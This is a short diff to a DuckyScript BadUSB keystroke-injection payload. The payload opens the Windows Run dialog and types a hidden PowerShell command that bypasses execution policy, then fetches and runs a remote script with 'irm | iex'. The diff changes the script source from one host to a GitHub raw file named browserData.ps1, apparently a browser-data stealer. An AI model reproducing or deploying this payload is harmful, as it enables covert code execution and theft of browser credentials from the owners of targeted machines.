@@ -1,4 +1,4 @@
 GUI r
 DELAY 500
-STRING powershell -w h -ep bypass $token='';irm https://jakoby.lol/hgw | iex
+STRING powershell -w h -ep bypass $token='';irm https://raw.githubusercontent.com/p-kozlakov/BadUSB/refs/heads/main/browserData.ps1 | iex
 ENTER
